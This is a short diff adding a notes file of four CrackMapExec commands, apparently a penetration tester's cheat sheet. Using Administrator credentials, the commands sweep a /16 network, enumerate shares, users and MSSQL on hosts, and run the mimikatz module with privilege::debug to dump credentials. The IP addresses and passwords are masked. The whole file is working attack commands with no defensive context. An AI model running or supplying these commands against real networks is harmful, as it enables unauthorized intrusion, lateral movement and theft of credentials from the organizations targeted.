@@ -1,0 +1,7 @@
+crackmapexec X.X.0.0/16 -t 100 -u Administrator -p 'XXXXXX' -d WORKGROUP
+
+crackmapexec X.X.X.139 -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP --shares --users --mssql
+
+crackmapexec X.X.X.139 -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP -M mimikatz -o COMMAND=privilege::debug
+
+crackmapexec X.X.X.X -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP --lusers --shares
